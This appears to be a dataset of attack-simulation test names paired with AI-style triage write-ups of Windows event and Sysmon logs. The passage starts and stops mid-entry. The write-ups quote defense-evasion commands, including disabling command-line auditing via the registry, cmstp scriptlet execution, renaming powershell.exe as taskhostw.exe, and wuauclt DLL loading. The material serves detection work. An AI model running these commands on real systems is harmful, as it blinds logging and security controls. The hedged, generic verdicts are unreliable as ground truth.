   - There are numerous entries related to Microsoft Edge Update processes. Though these indicate regular updates by the edgeupdate service, it's crucial to ensure these updates are not manipulated as cover for execution of unauthorized tasks, mainly when observed around suspicious behaviors like modifying WDigest settings.

**Assessment and Resolution:**
The logs reveal explicit signs of potentially malicious behavior, primarily related to the manipulation of system settings (e.g., WDigest registry changes) and minor system time alterations. The combination of these actions can suggest efforts towards compromising the system's security posture.

**Resolution: MALICIOUS**

**Recommendations and Steps Forward:**
- **Immediate Mitigation:**
  - Revert the WDigest registry value to ensure credentials are not stored in memory in plaintext.
  - Review user access and session logs for `admin_test` to verify any anomalous access or command execution patterns.
  
- **Enhanced Monitoring:**
  - Implement stricter monitoring on processes executed by high-privilege accounts, especially focusing on command-line interfaces.
  
- **System Audit:**
  - Perform a comprehensive audit of system integrity, focusing on any unauthorized changes to configuration files or unexpected behaviors.
  
- **Patch and Update Verification:**
  - Ensure all security patches and updates, particularly those for configurations like the Windows Time Service and authentication, are applied and verified as legitimate.

- **Review and Strengthen Security Policies:**
  - Reinforce security policies related to system time changes, and usage of command-line tools under high privileges."
Disable Windows Change Password Feature,"### Analysis:

#### Observations:
- **Whoami Executions:** There are multiple instances of `whoami.exe` being executed by `SERVER002\\admin_test`. While this utility is commonly used to display logged-on user information, frequent execution may indicate a script running to gather information about user context, especially during privilege escalation attempts.
  
- **Registry Modification:** The logs show a `cmd.exe` process executing a command to modify the registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System` setting a `REG_DWORD` named `DisableChangePassword` to `1`. This action, aimed at disabling password changes, is a potential indicator of nefarious intent to compromise security policies or user management.

- **Privileged Operations:** The account `SERVER002\\admin_test` is seen to have multiple privileged privileges assigned (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.), which could be leveraged in administrative or malicious tasks.

- **Microsoft Edge Updates:** There are numerous logs associated with Microsoft Edge Update processes running under the `NT AUTHORITY\SYSTEM` account. This is typical for system update tasks and does not appear to be linked to malicious activity but needs to be contextualized since it aligns with regular update behavior.

#### Indicators of Potential Malicious Activity:
- **Registry Modifications and Scripts:** The use and command parameters for `cmd.exe` suggest modification activity typical of scripts or changes targeted at user account management without user consent, which is often seen as an indicator of potential policy bypassing/misconfiguration or privilege escalation.
  
- **Event logs and Timeline of Activities:** The consistent timeline with back-to-back activities involving potentially sensitive operation execution (registry changes, accounts, and high integrity level processes) can sometimes reveal a pattern matching unauthorized adjustments in system configuration, potentially pointing to a compromised system if there was no authorized maintenance window or known system administrative activity expected during this period.

### Threat Assessment:
- **Suspicious Behavior:** The registry change to disable password policy settings combined with high-privilege execution context and frequent executions of reconnaissance-like tools (like `whoami`) depict suspicious activity. These actions often require further verification to assure compliance with administrative standards or uncover potential malicious actors leveraging administrative tools for lateral movement within the network.

### Resolution:
- **Resolution: SUSPICIOUS**
  - **Further Investigation Required:** Validate with the responsible administrator or system owner to confirm if these actions were part of authorized changes or updates.
  - **Audit Privileges and Permissions:** Check the accounts with notably high privileges for any unauthorized access, and audit recent modifications or logins associated with `admin_test`.
  - **Containment Action:** If unauthorized activity is suspected, isolate the affected host to prevent any further spread or exploitation while investigating any other associated suspicious logins or changes in user account settings/logs.
- **Recommendation:** Keep monitoring similar behavior across other hosts, employ logging and alerting rules on such registry changes or command executions under suspicious contexts, and consider enhancing endpoint security measures to detect deviations from normal behavior patterns."
Launches an executable using Rundll32 and pcwutl.dll,"Upon analysis of the provided logs, the following observations can be made:

### System and Time-related Events:
1. **Time Change Events (Event ID 1, 24)**: 
   - Events show changes to the system time, which could be potentially suspicious as altering the system time is often aligned with efforts to bypass logging or confuse forensic timelines. These changes are performed by `svchost.exe`, a legitimate Windows service host process.

### Sysmon Events:
2. **Process Creation Related to Windows Utilities**:
   - The occurrence of processes such as `hostname.exe`, `whoami.exe`, `cmd.exe`, and `rundll32.exe` in succession may appear suspicious. This sequence can sometimes indicate reconnaissance or potentially attempting to leverage `rundll32.exe` to execute a command. However, executed commands appear benign or typical of admin operations.
   - Execution of `wevtutil.exe` and `conhost.exe` under `SERVER002\admin_test` appears to be related to administrative activities as they interact with event logs and console windows.

3. **Edge Update Processes**:
   - Multiple events related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are observed. They seem to align with typical update processes (`/svc`, `/update`, `/regsvc`) and have the user context of `NT AUTHORITY\SYSTEM`.

### Security Events:
4. **Privilege Assignment Event (Event ID 4672)**:
   - User `admin_test` receives an array of privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.), these privileges are normal for administrative accounts but should still be scrutinized depending on the user’s job role.

5. **Successful Logon (Event ID 4624)**:
   - Indicates that the user `admin_test` logged on with NTLM authentication remotely. It corresponds with `DESKTOP-3HL5B2P`.

### Assessment and Guidance:
- **Suspicious**: The period of logs presents multiple Edge Update activities that align with typical software update procedures, hence benign. However, the manipulation of system time settings is worth investigating further. Time manipulation is a known tactic in cyber attacks, potentially to alter logging timelines or interfere with automated tasks tied to time.
- Administrative activities appear centralized around `admin_test`, an account executing tasks with elevated privileges; however, activities like privilege enabling and remote logon are typical if performed by IT admin staff.
  
**Resolution**: 
- **SUSPICIOUS** - The logs contain activity that does not outright indicate direct malicious actions but includes potential pre-indicators such as unauthorized time changes and the use of system processes that could warrant a deeper security review. I recommend further investigating the reasons and authorization behind the time changes and confirming the legitimacy of the remote logon session from `DESKTOP-3HL5B2P`. Additionally, review the responsibilities of `admin_test` to ensure activities align with normal operational duties."
Delete Microsoft Defender ASR Rules - InTune,"Upon analysis of the logs, several events can be identified as potentially suspicious, which warrant a closer examination:

1. **Time Manipulation**: The system logs show events with EventID 1 and 24 related to time changes. The ""NewTime"" in one of the events (EventID 1) is set to an earlier timestamp. While time adjustments by the Windows Time Service are normal, abrupt changes to an earlier timestamp could indicate tampering or an attempt to cover tracks after a malicious activity.

2. **Privilege Use**: The security logs show EventID 4672 indicating that the user ""admin_test"" was granted multiple privileges, including ""SeDebugPrivilege"", which often indicates heightened permissions that could be abused for malicious tasks like process injection or debugging sensitive processes.

3. **Suspicious PowerShell Activity**: Sysmon logs show PowerShell execution with EventID 1 for `powershell.exe` attempting to manipulate Windows Defender registry settings. The use of PowerShell to interact with registry keys and values, especially those related to security settings (e.g., ASR rules), could indicate an attempt to disable protections or modify security configurations.

4. **Repeated Use of Tools**: Repeated invocation of `wevtutil.exe` and `conhost.exe` by user ""admin_test"" may indicate attempts to interact with event logs or console applications, potentially to erase or manipulate logs.

5. **Microsoft Edge Update Activity**: Several processes pertaining to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are recorded across different logs. While such activity itself is not uncommon, the frequency and timing, coupled with other suspicious activities, could warrant verification that these updates are legitimate.

**Assessment**:
- The time skew and privilege escalation, along with registry edits via PowerShell run by ""admin_test"", are suspicious and leave room for potential misuse or tampering. Although legitimate administrative activities could surface similar logs, the specific context (e.g., registry modifications related to security systems and unusual times) requires cautious validation to rule out malicious intent.

**Resolution**: SUSPICIOUS

**Guidance**:
1. Validate the need and legitimacy of the PowerShell scripts that manipulated the registry and confirm they are part of the IT operational procedures or executed by a trusted script.
2. Verify any corresponding security tool alerts or logs around the same time frame for correlating evidence of suspicion.
3. Conduct a thorough review of ""server002"" for any discrepancies in user activity logs and ensure all password policies and user authentications are intact without unauthorized configurations.
4. Follow-up with reviewing the installed software integrity and the Windows Defender status to ensure that no protective services have been disabled."
Disable Windows Command Line Auditing using Powershell Cmdlet,"### Detailed Analysis of the Logs:

#### Suspicious or Anomalous Behavior:

1. **Time Change Events:**
   - Multiple instances of ""EventID: 4616"" in the Security log indicate a system time change. Time changes can be indicative of attempts to modify timestamps or cover tracks, though they are not inherently malicious without additional context.
   - Kernel and Time Service logs corroborate the time change events.
   
2. **SVCHOST Activity:**
   - The frequent invocation of `svchost.exe` is typically normal as it is a generic host process for services that run from dynamic-link libraries. No unusual behavior was identified concerning `svchost.exe`.

3. **Process Execution Events:**
   - **Sysmon EventID 1 and 5 logs** show repeated execution of `wevtutil.exe`, `conhost.exe`, and `powershell.exe` by `SERVER002\\admin_test`. This can indicate legitimate use, but elevated processes and PowerShell sessions require scrutiny.
   - **PowerShell Activity:**
     - Execution of PowerShell with the command:
       ```shell
       powershell.exe - {New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore}
       ```
     - This script modifies registry keys related to auditing process creation with command-line arguments. This action is suspicious and often used to evade detection systems by disabling logging of command lines.
   
4. **Microsoft Edge Update Activity:**
   - High occurrence of processes executing related to `MicrosoftEdgeUpdate.exe` is observed. While this could be just an application update process, its repetitive behavior and variety of command-line options (`/svc`, `/regsvc`, etc.) can merit further investigation.

#### Potential Indicators of Malicious Activity:

- **PowerShell Command:**
  - The PowerShell command modifies a registry setting that controls audit logging. Such actions are common in attacks attempting to disable logs or make forensic analysis more difficult. 

- **Process Execution Correlation:**
  - The processes `whoami.exe`, `hostname.exe`, and `PowerShell` executed in sequence by a user in a high-integrity context (`SERVER002\\admin_test`) indicate potentially suspicious behavior, especially when combined with registry changes to logging settings.

### Conclusion and Resolution:

- **Resolution: SUSPICIOUS**
  - The logs contain activities that are not outwardly malicious but are highly suspect and align with tactics often used to evade detection.
  - Specifically, the PowerShell script that alters registry settings to disable command-line auditing raises concerns about potential malicious intent.
  
### Guidance on How to Proceed:

1. **Conduct a Thorough Investigation:**
   - Investigate the purpose and source of the PowerShell command to understand the actor's intent.
   - Check for any unauthorized access or changes by the `SERVER002\\admin_test` account.
   
2. **Review Security Configurations:**
   - Ensure that auditing settings for process command lines are restored and enhanced.
   - Implement stricter monitoring for PowerShell and administrative tasks.

3. **Monitor for Further Indicators:**
   - Continuously monitor for further suspicious activities, especially those involving PowerShell and process executions under high-integrity levels.
   
4. **Consult with IT/Forensic Experts:**
   - Engage cybersecurity experts to conduct a deeper analysis of the system to identify any additional risks or compromised areas."
Disable Remote Desktop Anti-Alias Setting Through Registry,"Upon reviewing the provided Sysmon logs, several events potentially indicate suspicious or malicious activities:

1. **Use of Administrative Utilities**:
   - Multiple instances of `whoami.exe` execution are observed, sometimes in quick succession ('ProcessId':'4908', '7032', etc.). While this utility is legitimate and regularly used to check user identity, frequent or unexpected uses may suggest reconnaissance activity by an attacker who wants to confirm the current user context.
   - Notably, the processes operate at a high integrity level, suggesting privileged execution under the `SERVER002\\admin_test` user, which might be typical in a legitimate administrative context but could also hint at privilege escalation attempts or misuse of administrative privileges.

2. **Registry Modification**:
   - An instance of `cmd.exe` is invoked to modify the Windows registry by adding a new key to disable specific remote desktop settings (`DisableRemoteDesktopAntiAlias`). This command is executed by the `admin_test` user using `reg.exe`. Typical system administration tasks may involve registry edits, but unsanctioned or unusual changes could be a vector for attack, potentially aiding further misconfigurations or creating backdoors.
  
3. **Execution of System Utilities**:
   - There are several entries where `wevtutil.exe`, a tool often used to manage event logs, is executed by `admin_test`. Its use in a benign context should be rare and well-documented within administrative activity. Unanticipated log clearance or export could indicate log tampering to hide tracks.
   - The repeated invocation of utilities like `conhost.exe` under the `admin_test` user, appearing frequently and sometimes as a child process of CLI utilities, could suggest attempts to invoke console processes for executing or automating command tasks.

4. **Microsoft Edge Auto-Updater Entries**:
   - The presence of `MicrosoftEdgeUpdate.exe` and its temporary execution path (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU5EC0.tmp`) generally indicates routine update system execution. This is typical behavior, though monitoring for execution anomalies is advisable, particularly in unattended contexts.

In summary, while some activities indicated by these logs (e.g., utility execution, registry modifications) may align with legitimate administrative tasks, the context and frequency suggest they warrant deeper investigation. Specifically, the unsanctioned registry change, potential reconnaissance steps, and possible log tampering behavior raise flags.

**Resolution: SUSPICIOUS**

### Recommended Actions:
- **Further Investigation**: Verify whether these actions were part of scheduled system administration or maintenance tasks. Review related user activity and confirm with the user/admin (`admin_test`) about the purpose of said actions.
- **Check Logs**: Correlate with Security, System, and Application logs, as well as user audit trails, to identify any unusual behavior or corresponding events that may provide additional context.
- **Isolation & Monitoring**: If any abnormality is consistent with previous security incidents, consider further containment measures like isolating the machine and enhancing monitoring on user accounts and relevant systems.
- **Policy Review**: Evaluate group policies and registry configurations for any unauthorized changes and ensure that security policies and privileges are correctly enforced. Consider reverting dubious registry changes if they do not align with security policies.
"
Change Powershell Execution Policy to Bypass,"### Detailed Analysis of the Logs

1. **Unusual Process Executions and Privileges**
   - The frequent occurrence of `wevtutil.exe` and `conhost.exe` being executed multiple times within a very short time frame could indicate automated or script-driven activity. This is unusual and may not align with typical manual operations.
   - Use of `wevtutil.exe`, a utility that can manage event logs, is generally suspicious if not part of a known administrative task or maintenance window.
   - `Powershell.exe` was executed with the command line argument to bypass execution policy: `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine`. While legitimate in some contexts, this is a known tactic used to circumvent security controls.

2. **Command-Line Arguments of Concern**
   - The `Set-ExecutionPolicy Bypass` in PowerShell usage is a common red flag for attempts to execute scripts that would otherwise be restricted by policy.
   
3. **Privilege Escalation**
   - There's no clear evidence of privilege escalation attempts. All processes are running under the specified user `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`, which is normal behavior for administrative tasks. However, the use of high privileges in the context of suspicious activities such as executing PowerShell scripts with bypassed execution policy raises concerns.

4. **Normal Activity**
   - The Microsoft Edge Update processes seem legitimate as they reside in their expected directories, are signed, and are executed by `NT AUTHORITY\SYSTEM`. This aligns with normal software update activities.

5. **Time Change Event**
   - The time change event recorded in the System and Security logs is an adjustment from 14:35:31.8200757 to 14:35:57.6361984, likely part of normal time synchronization. However, slight time changes on systems do sometimes accompany adversarial activity to evade detection or correlate to activities.

### Threats and Risks Identified
- The multiple executions of administration tools and standard Windows processes in rapid succession, combined with the modification of PowerShell execution policies, signify potentially automated, scripted activity.
- The `Set-ExecutionPolicy` being used to bypass security measures strongly indicates an attempt to execute unauthorized scripts or applications.
  
### Guidance on How to Proceed
- **Immediate Action Needed**: Investigate and validate the activities. Check if there are correlating legitimate administrative tasks scheduled or being performed by `SERVER002\admin_test`.
- **Network Traffic Analysis**: Review network traffic from `Server002` for suspicious connections or data exfiltration.
- **File Integrity**: Verify the integrity and origin of scripts executed during the timeframe, especially those involving PowerShell.
- **User Review**: Confirm the legitimacy of the `SERVER002\admin_test` account’s recent activities including reconciliations against user permissions and typical use patterns.

### Resolution
- **SUSPICIOUS**: While evidence of compromise isn’t definitive, the logs exhibit unusual activity that warrants further investigation to rule out potential malicious activity."

   - Sequence of PowerShell activities where a virtual machine is being manipulated. Commands related to creating a virtual machine (`New-VM`) and setting firmware configurations are executed.
   
2. **System Logs:**
   - Several Kernel-General events related to time adjustments, seemingly from normal operations involving `svchost.exe`.
   - Time synchronization entries showing time updates.

3. **Security Logs:**
   - Auditing logs showing time change events involving a process `svchost.exe`.

4. **Sysmon Logs:**
   - Various process creation events involving Microsoft Edge update processes.
   - Commands such as `MicrosoftEdgeUpdate.exe /svc` and `MicrosoftEdgeUpdate.exe /c` executed under SYSTEM user context.
   - `whoami.exe` and `hostname.exe` tasks executed by a user account (`SERVER002\\admin_test`).

### Key Observations

1. **PowerShell Activity:**
   - The executed script in the PowerShell logs indicates benign system administration activities such as virtual machine configuration, without any explicit malicious indicators. The command format is straightforward and typical for managing virtual machines on a hypervisor.
   - No evidence of download or execution of external scripts that usually indicate a potential compromise scenario.

2. **System Time Changes:**
   - Time adjustment logs are generally benign and indicate normal syncing behavior with time service servers (e.g., `time.windows.com`).

3. **Security Logs:**
   - Primarily capture events related to time changes, generally expected in services running as a local service on a Windows OS.

4. **Sysmon Logs:**
   - The variety of events all relate to legitimate Microsoft Edge updating processes. These entries are consistent with an application update scenario, which includes various stages of the update process.
   - The execution of utilities such as `whoami.exe` and `hostname.exe` might suggest some level of system monitoring or routine checks. However, these are not inherently malicious and match standard diagnostic activities.
   - The fact that `MicrosoftEdgeUpdate.exe` processes are running under the SYSTEM account is normal, given the task of updating critical software.

### Conclusion

**Resolution: BENIGN**

The combined assessment of the logs indicates routine administrative and update activities:
- PowerShell commands appear to be legitimate and typical for system administration tasks.
- System time adjustments are aligned with normal time service protocols.
- Security and Sysmon log entries do not contain any indicators of compromise; they depict legitimate software updates and routine system operations.

All observed activities appear to be standard practices with no identifiable malicious behavior. However, it might be prudent to verify with the server administrators or IT operations team if there were expected/authorized maintenances or virtual machine tasks recently, ensuring that all activities align with their records."
CMSTP Executing Remote Scriptlet,"Upon reviewing the provided Windows event logs, the following observations and conclusions can be made:

### Key Observations:

1. **Application Log**:
   - There are records of the `edgeupdate` service stopping at two different times. This in itself isn't inherently suspicious as updates could trigger such behavior.
   - Windows Defender is consistently in the `SECURITY_PRODUCT_STATE_ON` state, indicating that it is enabled.

2. **Sysmon Log**:
   - Several instances of normal Windows processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `cmstp.exe`, and others were executed. Many of these are legitimate processes that can also be leveraged by malicious actors in various attacks, such as running scripts or hiding malicious activity.
   - A notable command line is executed via `cmd.exe` with `cmstp.exe`, which can be leveraged for privilege escalation or malicious execution through a method known as `cmstp.exe bypass`. The command line seen here (`""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.inf""`) could potentially indicate malicious activity if not intended by the user.
   - There are multiple Edge Update processes executed, which appear to be part of routine update checks or installations. The command lines for these processes with update and registration commands are expected behavior for automatic updates, but should be verified if they match scheduled update patterns in your organization.

3. **Security Log**:
   - Multiple security log entries for logon type `5` (Service Logon), which is typical for services running under system context.
   - Event ID `4672` logs typical privileges that are granted to system-level accounts; no anomalies noted in privileges.

### Assessment:

- The execution of `cmd.exe` launching `cmstp.exe` with `/s` is notable. This could be legitimate or potentially malicious if used as a bypass for security controls. Normally, `cmstp.exe` should not be executed with scripts in user directories unless intended for a specific purpose by an administrator or application. This pattern is suspicious and warrants further investigation.
- The activity around Microsoft Edge updates seems routine and consistent with expected update processes.

### Resolution:

- **SUSPICIOUS**: 
   - The presence of the `cmd.exe` and `cmstp.exe` activity is suspicious and needs more investigation to confirm whether it was legitimate or an attempt to bypass security controls. Conduct further analysis on this activity: check known good activity patterns, user intentions, and source of the `.inf` file involved. Ensure to verify with the user or administrator if this action was expected or authorized.

**Recommendation**: 
- Review user activity around the time of suspicious command execution.
- Investigate the origin and content of the `.inf` file used with `cmstp.exe`.
- Check the digital signatures and hashes for integrity of executable files involved in suspicious activity.
- Ensure the machine is fully patched and protected by the most recent versions of antivirus and endpoint protection solutions."
Suppress Win Defender Notifications,"Based on the analysis of the provided log entries from the Security, Sysmon, System, and Application logs, here's a detailed breakdown:

### Security Log Analysis:
1. **Event ID 4616**: Indicates a change in system time. This can occasionally be indicative of nefarious activity if an attacker is trying to bypass logging mechanisms or alter time-stamps to cover their tracks.
2. **Event ID 4634**: Logoff event for the account ""admin_test"" using Logon Type 3, which is a network logon. This might be normal activity unless correlated with unauthorized or suspicious access patterns.
3. **Event ID 4672**: Special privileges assigned to ""admin_test"". The assigned privileges include some high-level ones like SeDebugPrivilege and SeLoadDriverPrivilege, which could be leveraged for malicious purposes, particularly if not associated with expected and documented administrative tasks.
4. **Event ID 4624**: Successful network logons for ""admin_test"". The two logon events (one from IPv6 and one from a private IPv4 address) might be normal depending on the expected administrative access patterns. It’s worth noting the use of NTLM which is a weaker authentication protocol.

### Sysmon Log Analysis:
1. **Process Execution (Event ID 1, 5)**:
   - Multiple executions of `wevtutil.exe` and `cmd.exe` followed by registry modification commands (`reg.exe`). Usage of `cmd.exe` to modify Windows Defender policies, specifically to suppress notifications, which can be suspicious as it dampens visibility of security alerts.
   - The use of `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` - These actions may be indicative of reconnaissance or standard administrative checks but context is needed to confirm their benignity.
   - Repeated launching of processes with elevated permissions which, without documented need, could signal an attempt to perform privileged operations without detection.

### System Log Analysis:
- The logs indicate a system time change which though may have legitimate reasons (e.g., time synchronization issues), is suspicious without proper context.
  
### Application Log Analysis:
- Edge update processes like `MicrosoftEdgeUpdate.exe` and related processes seem routine, showing update actions by Microsoft Edge Update. This usually aligns with normal application maintenance and update procedures.

### Assessment:
1. **Time Change & Elevated Privileges**: The change in system time could be an attempt to manipulate the environment along with the granting of elevated privileges and suppressing Windows Defender notifications which is concerning.
2. **Logon Events**: Although network logons and special privilege assignments might be part of routine admin activities, combined with other suspicious activities, they necessitate further investigation to rule out improper access.
3. **Command Execution**: The modification of Windows Defender settings directly impacts security posture and indicates possible malicious intent. However, documentation or verification of administrative task lists is required to confirm if these activities were expected.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
- The logs contain activities that warrant further investigation to confirm if these are authorized administrative activities. It is crucial to investigate:
  - The context of the time change events.
  - Any direct system administrators or IT task schedulings that align with privilege elevations and suppression of Windows Defender alerts.
  - Verify if the network logons are expected and authenticated.

### Recommendations:
- Verify scheduled tasks and administrative policies to check if the activities logged are expected.
- Review access lists against the network logon details to verify legitimate access.
- Conduct a deeper review of system changes, especially around the time settings and defender configurations, to validate the legitimacy of the actions.
- If these activities were not authorized, initiate incident response protocols to contain and investigate the potential breach."
Masquerading - powershell.exe running as taskhostw.exe,"After examining the provided logs, here are my key observations and assessment:

### Suspicious Behavior Observed:
1. **TaskHostW Execution**: The PowerShell log shows that a process `taskhostw.exe` located in `C:\Users\admin_test\AppData\Roaming\` is being executed. This process is typically part of Windows but its presence in such a directory is unusual. Additionally, Sysmon logs show `cmd.exe` executed with a command to copy `powershell.exe` to `taskhostw.exe`, which indicates a potential masquerading or persistence attempt:
   - `""cmd.exe\"" /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y""`

2. **Admin Privileges**: The logs show that the `taskhostw.exe` is run by the user `admin_test` with high integrity, suggesting it has administrative privileges (Sysmon EventID 1).

3. **Privilege Escalation Attempts**: Security logs indicate that the user `admin_test` has privileged operations, including SeDebugPrivilege, SeBackupPrivilege, indicating potential for misuse or targeted an exploit for higher privileges.

### Analysis:
- The presence of `taskhostw.exe` in the user’s AppData and its execution mimicking PowerShell strongly suggests a potential compromise or at the very least, suspicious activity. 
- The execution of `cmd.exe` to copy PowerShell executable indicates a potential persistence technique using known processes and renaming them to potentially disguise as legitimate processes.
  
### Guidance:
- Immediately investigate the origin of `taskhostw.exe` in the mentioned path. Determine if this was a part of any legitimate activity (e.g., deploy scripts) or a result of malicious actions.
- Investigate the user `admin_test` to understand the expected context and actions of this user during the time frame of these logs.
- Consider scanning the host with updated anti-malware solutions to check for any anomalies or confirmed malicious binaries.
- Review potential lateral movement by examining if similar patterns are noted across other systems in the network.

### Resolution:
Based on the activities and evidence provided, the logs are categorized as: **MALICIOUS**. There is clear evidence of suspicious activity that might indicate system compromise and should be addressed immediately."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"### Analysis of the Provided Windows Event Logs

#### Summary of Findings

1. **PowerShell Execution**: The logs show an execution of `powershell.exe` by `SERVER002\admin_test`. PowerShell executions should be closely monitored as they can often be utilized by attackers for lateral movement and system reconnaissance. However, without additional information on the specific script or command run, this alone is not conclusive evidence of malicious activity.

2. **Use of `wevtutil.exe`**: Multiple instances of `wevtutil.exe` are logged. This utility can be used for legitimate purposes, such as querying or clearing event logs. However, it can also be used by attackers to clear logs as part of anti-forensic activities. The timing and frequency of these logs could warrant further investigation, especially in conjunction with other suspicious activities.

3. **Command Execution via `cmd.exe`**: An instance of `cmd.exe` is observed with a command to `wuauclt.exe` executing an update with deployment provider targeting a `calc.dll`. The `wuauclt.exe` tool is part of Windows Update, but it is unusual to use it in such a manner, potentially indicating a `DLL hijacking` or similar attempt to run malicious code.

4. **`wuauclt.exe` With Unusual Parameters**: The process `wuauclt.exe` is started with the `/UpdateDeploymentProvider` parameter. This is not a typical operation for this executable and suggests potential misuse for executing arbitrary code, potentially associated with lateral movement or persistence tactics by an attacker.

5. **Security Auditing**: Numerous logons by `SYSTEM` are recorded (Event ID 4624) with elevated privileges (Event ID 4672). Moreover, several events (4798) querying user details indicate potential reconnaissance activity. This could suggest privilege escalation or an attempt to gather information about the system or user accounts.

6. **Service Control Commands**: Instances of `sc.exe` starting services like `wuauserv` and `pushtoinstall registration` found. The `wuauserv` is a Windows Update service which is typical, but `pushtoinstall` service registration can be less common, suggesting an aberration or exploration of service configurations.

#### Indicators of Potential Compromise

- **Suspicious Execution of DLL**: The use of `wuauclt.exe` to update a deployment provider with an unusual DLL (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\calc.dll`) is particularly noteworthy.
- **Multiple `cmd.exe` Executions**: The use of command-line interfaces in conjunction with the aforementioned DLL suggests potentially malicious scripting or operational activity.
  
#### Final Assessment

Based on the observations in the logs including unusual `wuauclt.exe` activity, use of `cmd.exe` to execute suspicious commands, and multiple high-privilege service launches and user enumeration activities without clear justification, there are indications that these events could point to malicious activity or an attempted compromise. The presence of such patterns necessitates a deeper investigation.

### Resolution: MALICIOUS

### Recommendations

1. **Immediate Review**: Conduct a thorough investigation into `SERVER002\admin_test` activity, especially focusing on scripts or commands executed with PowerShell and examine filesystem paths accessed during the execution of suspected operations.

2. **Incident Response**: Initiate incident response procedures to investigate the processes involving unusual use of `wuauclt.exe`, focusing on any changes or alterations to system DLLs or configurations.

3. **Detailed Forensic Analysis**: Analyze disk and memory images for any traces of the potentially malicious `calc.dll` file and related activities.

4. **Audit Configurations and Access**: Review system configurations and user accounts for anomalous changes or access during the timeline observed.

5. **Monitoring and Logging Enhancements**: Enhance logging and monitoring, particularly around PowerShell and command-line executions to ensure detailed capture of operations for future analysis."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"Upon reviewing the provided logs, the following points were identified as potentially suspicious:

1. **Security Log Analysis**:
   - **EventID 4798**: Queries regarding user accounts from a process called `CompatTelRunner.exe`, typically related to Microsoft Compatibility Telemetry, are targeting several accounts, including privileged ones like ""Administrator"" and unconventional ones like ""admin_test"", ""lplui"", and ""testing"".
   - **Repeated use of CompatTelRunner.exe**: This process is related to telemetry but querying several accounts at once is unusual unless it's part of a legitimate monitoring process, which should be verified.
   - **EventID 4799**: This event logs queries about group membership for groups like ""Administrators"", executed by the same process (`CompatTelRunner.exe`). This aligns with potential intelligence-gathering activity, aiming to enumerate users and groups.
   
2. **Sysmon Log Analysis**:
   - Execution of `powershell.exe` by a user `admin_test` with high integrity level privileges and a specific command `Invoke-ATHRemoteFXvGPUDisablementCommand`. This could indicate the execution of potentially malicious PowerShell commands, especially since specific module paths are being referenced.
   - `wevtutil.exe` is used multiple times. In some cases, attackers use `wevtutil.exe` to clear or manipulate event logs (though there's no evidence of clearing in the provided logs).
   - `hostprocess.exe` and `whoami.exe` are executed by the same user `admin_test`, signifying process enumeration or environment probing which can be indicative of lateral movement preparation.

3. **PowerShell Logs**:
   - Various events showing the starting of several providers with high-severity logs. This indicates PowerShell activity with a structured command using `Invoke-ATHRemoteFXvGPUDisablementCommand`. Evaluation of the script, its origin, and effects are necessary to ascertain its legitimacy.

4. **General Observations**:
   - The pattern and timing of these events suggest a script or tool was executed that queries system information and possibly modifies or gathers extensive environment data.
   - The repetitive telemetry and PowerShell activity by the `admin_test` account without clear justification in a tightly controlled environment like a server, suggests abnormal behavior.

### Conclusion:
This set of logs indicates **SUSPICIOUS** behavior that necessitates further investigation. The use of telemetry runner and PowerShell scripts to query privileged information aligns with tactics used in the pre-compromise phase of cyber attacks.

### Guidance on How to Proceed:
- **Verify Legitimate Activity**: Confirm if any authorized administrative or maintenance tasks align with these logs. These could include routine system monitoring or audits by IT personnel.
- **Examine PowerShell Scripts**: Review the contents and origin of the PowerShell commands being executed, possibly involving your incident response team if authorization isn’t evident.
- **Account Activity Audit**: Review the `admin_test` account for unexpected changes and additional processes linked to it around the event timestamps.
- **Security Controls Review**: Double-check current security controls, alerts, and threshold settings, ensuring tampering with logs or privilege escalation is reported and mitigated.
- **Forensic Investigation**: If authorized and resources permit, consider deeper forensic investigation to understand the full impact.

These steps will help ascertain the true intent and origin of the suspicious behavior detected in these logs."
Create Windows System File with powershell,"In reviewing the provided event logs from the Windows host, several entries warrant attention due to their potential implication of suspicious or anomalous behavior:

1. **Sysmon Activity**:
   - There are multiple entries of `cmd.exe` executions. The command line arguments suggest a script-like behavior that checks for the existence of a file (`data.txt`) in the temp directory and modifies its attributes. The use of `powershell.exe` to set file attributes to 'System' could indicate an attempt to hide files.
   - The `cmd.exe` execution involves conditional logic to interact with `data.txt`: `""cmd.exe"" /c IF EXIST %temp%\data.txt ( EXIT 0 ) ELSE ( EXIT 1 )`. This activity indicates a script might be conditionally executing based on file presence, possibly related to batch operations or data manipulation.
   
2. **Shell Host Executions**:
   - There are instances of `conhost.exe` that seem to correspond with command prompt windows, which are standard for GUI operations tied to command-line executions. These correlate with the `cmd.exe` processes and suggest batch processing activities.
   
3. **PowerShell Invocations**:
   - The `PowerShell` log includes entries indicating that PowerShell scripts are being run with attributes to modify file states. The command specified involves the modification of `file.attributes='System'`, hinting at potentially obfuscating file visibility.
   - The consistent use of PowerShell and command-line scripting within a very short timeframe can indicate automated tasks or potential unauthorized script execution.

4. **Microsoft Edge Update Processes**:
   - The log shows multiple processes related to `MicrosoftEdgeUpdate.exe`. While some system update processes are legitimate, the sheer number of executions and the tie-ins to temporary directories (`\\Microsoft\\Temp\\EU7313.tmp`) could suggest side-loading or misdirection for potentially malicious update execution.

5. **High Integrity Levels**:
   - Many of the logged processes are executed with a high integrity level, which represents elevated permissions. While this might be standard for administrative scripts, the file manipulations and updates being executed with high privileges could present risks if these processes are not authorized or intended.

**Assessment**:
